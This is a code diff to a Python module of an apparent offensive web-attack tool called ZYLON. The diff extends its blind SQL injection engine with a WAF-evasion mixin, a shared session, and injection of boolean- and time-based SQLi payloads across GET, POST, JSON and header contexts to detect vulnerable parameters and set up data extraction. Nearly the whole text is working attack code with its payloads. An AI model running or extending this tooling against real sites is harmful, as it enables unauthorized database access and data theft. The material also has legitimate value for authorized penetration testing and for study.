@@ -19,7 +19,6 @@
    6. Multi-DBMS Support (MySQL, PostgreSQL, SQLite, MSSQL, Oracle)
 """
 
-import re
 import time
 import asyncio
 import threading
@@ -33,6 +32,8 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 from rich.console import Console
 from rich.table import Table
 from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
+
+from core.shared_infra import shared_session, regex_cache, PayloadInjector, WAFEvasionMixin
 
 console = Console()
 
@@ -273,7 +274,7 @@ class InferenceEngine:
             negated (bool): Negate the inference result
             delay (float): Delay between requests (seconds)
         """
-        self.session = session
+        self.session = session or shared_session
         self.url = url
         self.method = method.upper()
         self.headers = headers or {}
@@ -728,7 +729,7 @@ class BlindSQLiExtractor:
 # HAKUIN ENGINE - ZYLON Integration Layer
 # ============================================================================
 
-class HakuinEngine:
+class HakuinEngine(WAFEvasionMixin):
     """ZYLON FUSION Hakuin Engine - Blind SQLi Optimized Extraction.
     Fuses Hakuin's research-grade optimization algorithms into ZYLON.
 
@@ -740,13 +741,14 @@ class HakuinEngine:
         60 - Blind SQLi Speed Test (Compare vs Traditional)
     """
 
-    def __init__(self, session):
+    def __init__(self, session=None):
         """Initialize Hakuin Engine.
 
         Params:
-            session (requests.Session): ZYLON's HTTP session
+            session (requests.Session): ZYLON's HTTP session (defaults to shared_session)
         """
-        self.session = session
+        super().__init__()
+        self.session = session or shared_session
         self.extractor = None
         self.inference = None
 
@@ -941,15 +943,18 @@ class BlindSQLiDetector:
         ("')) AND 1=1-- -", "')) AND 1=2-- -"),
     ]
 
-    def __init__(self, session):
-        self.session = session
+    def __init__(self, session=None):
+        self.session = session or shared_session
+        self.injector = PayloadInjector(self.session)
 
-    def detect(self, url, param=None):
+    def detect(self, url, param=None, inject_context='all'):
         """Detect blind SQLi vulnerabilities on a target.
 
         Params:
             url (str): Target URL
             param (str): Specific parameter to test (optional)
+            inject_context (str): Injection context - 'get', 'post', 'json',
+                                  'header', or 'all' for multi-context testing
 
         Returns:
             dict: Detection results with vulnerability info
@@ -962,6 +967,7 @@ class BlindSQLiDetector:
             'dbms': None,
             'evidence': [],
             'inference_config': None,
+            'injection_contexts': [],
         }
 
         # Get baseline response
@@ -973,86 +979,97 @@ class BlindSQLiDetector:
         except Exception:
             return results
 
-        # Test boolean-based blind SQLi
+        # Test boolean-based blind SQLi across multiple injection contexts
         for true_payload, false_payload in self.BOOLEAN_PAYLOADS:
-            test_url_true = self._inject_payload(url, param, true_payload)
-            test_url_false = self._inject_payload(url, param, false_payload)
+            # Use PayloadInjector for multi-context injection
+            contexts_to_test = [inject_context] if inject_context != 'all' else ['get', 'post', 'json', 'header']
 
-            try:
-                resp_true = self.session.get(test_url_true, verify=False, timeout=10)
-                resp_false = self.session.get(test_url_false, verify=False, timeout=10)
+            for ctx in contexts_to_test:
+                try:
+                    resp_true = self.injector.inject(url, param, true_payload, context=ctx)
+                    resp_false = self.injector.inject(url, param, false_payload, context=ctx)
 
-                # Check if true and false responses differ
-                len_diff = abs(len(resp_true.text) - len(resp_false.text))
-                status_diff = resp_true.status_code != resp_false.status_code
+                    if resp_true is None or resp_false is None:
+                        continue
 
-                if (len_diff > 50 or status_diff) and resp_true.status_code == baseline_status:
-                    results['vulnerable'] = True
-                    results['type'] = 'boolean'
-                    results['evidence'].append({
-                        'technique': 'boolean_based',
-                        'true_payload': true_payload,
-                        'false_payload': false_payload,
-                        'true_length': len(resp_true.text),
-                        'false_length': len(resp_false.text),
-                        'length_diff': len_diff,
-                    })
+                    # Check if true and false responses differ
+                    len_diff = abs(len(resp_true.text) - len(resp_false.text))
+                    status_diff = resp_true.status_code != resp_false.status_code
 
-                    # Determine inference method
-                    if status_diff:
-                        results['inference_config'] = {
-                            'inference_type': 'status',
-                            'inference_content': str(resp_true.status_code),
-                        }
-                    else:
-                        # Find distinguishing content
-                        true_set = set(resp_true.text.split())
-                        false_set = set(resp_false.text.split())
-                        diff_words = true_set - false_set
-                        if diff_words:
-                            marker = list(diff_words)[0]
+                    if (len_diff > 50 or status_diff) and resp_true.status_code == baseline_status:
+                        results['vulnerable'] = True
+                        results['type'] = 'boolean'
+                        results['injection_contexts'].append(ctx)
+                        results['evidence'].append({
+                            'technique': 'boolean_based',
+                            'context': ctx,
+                            'true_payload': true_payload,
+                            'false_payload': false_payload,
+                            'true_length': len(resp_true.text),
+                            'false_length': len(resp_false.text),
+                            'length_diff': len_diff,
+                        })
+
+                        # Determine inference method
+                        if status_diff:
                             results['inference_config'] = {
-                                'inference_type': 'body',
-                                'inference_content': marker,
+                                'inference_type': 'status',
+                                'inference_content': str(resp_true.status_code),
                             }
-                    break
-            except Exception:
-                continue
+                        else:
+                            # Find distinguishing content
+                            true_set = set(resp_true.text.split())
+                            false_set = set(resp_false.text.split())
+                            diff_words = true_set - false_set
+                            if diff_words:
+                                marker = list(diff_words)[0]
+                                results['inference_config'] = {
+                                    'inference_type': 'body',
+                                    'inference_content': marker,
+                                }
+                        break
+                except Exception:
+                    continue
+            if results['vulnerable'] and results['type'] == 'boolean':
+                break
 
         # Test time-based blind SQLi if boolean not found
         if not results['vulnerable']:
             for dbms, payloads in self.TIME_PAYLOADS.items():
                 for payload in payloads:
-                    test_url = self._inject_payload(url, param, payload)
-                    try:
-                        start = time.time()
-                        resp = self.session.get(test_url, verify=False, timeout=15)
-                        elapsed = time.time() - start
+                    for ctx in (contexts_to_test if results.get('injection_contexts') is not None else ['get']):
+                        try:
+                            start = time.time()
+                            resp = self.injector.inject(url, param, payload, context=ctx)
+                            elapsed = time.time() - start
 
-                        if elapsed >= 2.5:  # At least 2.5s delay
-                            results['vulnerable'] = True
-                            results['type'] = 'time'
-                            results['dbms'] = dbms
-                            results['evidence'].append({
-                                'technique': 'time_based',
-                                'dbms': dbms,
-                                'payload': payload,
-                                'delay': f"{elapsed:.1f}s",
-                            })
-                            results['inference_config'] = {
-                                'inference_type': 'time',
-                                'inference_content': '3',  # seconds
-                            }
-                            break
-                    except Exception:
-                        continue
+                            if elapsed >= 2.5:  # At least 2.5s delay
+                                results['vulnerable'] = True
+                                results['type'] = 'time'
+                                results['dbms'] = dbms
+                                results['evidence'].append({
+                                    'technique': 'time_based',
+                                    'context': ctx,
+                                    'dbms': dbms,
+                                    'payload': payload,
+                                    'delay': f"{elapsed:.1f}s",
+                                })
+                                results['inference_config'] = {
+                                    'inference_type': 'time',
+                                    'inference_content': '3',  # seconds
+                                }
+                                break
+                        except Exception:
+                            continue
+                    if results['vulnerable']:
+                        break
                 if results['vulnerable']:
                     break
 
         return results
 
     def _inject_payload(self, url, param, payload):
-        """Inject a payload into a URL parameter."""
+        """Inject a payload into a URL parameter. Kept for backward compat."""
         if param:
             if '?' in url:
                 return f"{url}&{param}={payload}"
